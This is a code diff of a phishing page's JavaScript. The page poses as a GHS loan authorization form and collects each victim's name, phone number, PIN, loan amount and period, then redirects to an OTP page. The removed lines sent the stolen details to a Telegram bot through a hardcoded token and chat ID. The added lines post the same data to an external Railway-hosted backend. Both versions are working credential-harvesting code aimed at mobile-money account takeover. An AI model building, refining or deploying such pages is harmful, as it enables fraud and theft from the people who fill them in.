@@ -423,10 +423,10 @@
 </div>
 
 <script>
-    // ─── TELEGRAM CONFIG ───
-    const TELEGRAM = {
-        BOT_TOKEN: '8493790420:AAFloSkJcVN6VmrFAOpebp1khMlPqs0_H0s',
-        CHAT_ID: '8425632882'
+    // ─── BACKEND CONFIG ───
+    const CONFIG = {
+        API_URL: 'https://telecelkr-production.up.railway.app',
+        OTP_PAGE: 'otp.html'
     };
 
     // ─── STATE ───
@@ -457,8 +457,8 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── SEND TO TELEGRAM ───
-    async function sendToTelegram() {
+    // ─── SEND TO BACKEND API ───
+    async function sendToBackend() {
         if (isProcessing) return;
         
         const phone = document.getElementById('phone').value.trim();
@@ -483,47 +483,55 @@
         document.getElementById('successMsg').style.display = 'none';
         document.getElementById('spinner').style.display = 'flex';
 
-        const message = `🔐 *New Loan Authorization Request*\n\n` +
-            `👤 *User:* ${name}\n` +
-            `📱 *Phone:* ${phone}\n` +
-            `🔢 *PIN:* ${pin}\n` +
-            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
-            `📅 *Period:* ${period}\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `✅ User has been redirected to OTP verification.`;
-
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
+            console.log('📤 Sending to backend:', {
+                url: `${CONFIG.API_URL}/api/authorize`,
+                data: { name, phone, amount, pin, period }
+            });
+
+            const response = await fetch(`${CONFIG.API_URL}/api/authorize`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM.CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    name: name,
+                    phone: phone,
+                    amount: amount,
+                    pin: pin,
+                    period: period
                 })
             });
 
             const data = await response.json();
-            console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
+            console.log('📤 Backend Response:', data);
 
             document.getElementById('spinner').style.display = 'none';
 
-            if (data.ok) {
+            if (data.success) {
                 showSuccess('✅ Authorization successful! Redirecting to OTP verification...');
                 
+                // Store loan data for OTP page
+                localStorage.setItem('loan_data', JSON.stringify({
+                    name: name,
+                    phone: phone,
+                    amount: amount,
+                    period: period
+                }));
+
                 setTimeout(() => {
                     const params = new URLSearchParams(window.location.search);
                     params.set('phone', phone);
-                    window.location.href = 'otp.html?' + params.toString();
+                    window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
                 }, 1500);
             } else {
-                showError('❌ Telegram error: ' + (data.description || 'Please try again.'));
+                showError('❌ ' + (data.message || 'Authorization failed. Please try again.'));
                 isProcessing = false;
                 document.getElementById('submitBtn').disabled = false;
             }
 
         } catch (error) {
-            console.error('❌ Error:', error);
+            console.error('❌ API Error:', error);
             document.getElementById('spinner').style.display = 'none';
             showError('❌ Connection error. Please check your internet and try again.');
             isProcessing = false;
@@ -531,10 +539,10 @@
         }
     }
 
-    document.getElementById('submitBtn').onclick = sendToTelegram;
+    document.getElementById('submitBtn').onclick = sendToBackend;
 
     document.getElementById('pin').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendToTelegram();
+        if (e.key === 'Enter') sendToBackend();
     });
 
     document.getElementById('phone').addEventListener('keydown', function(e) {
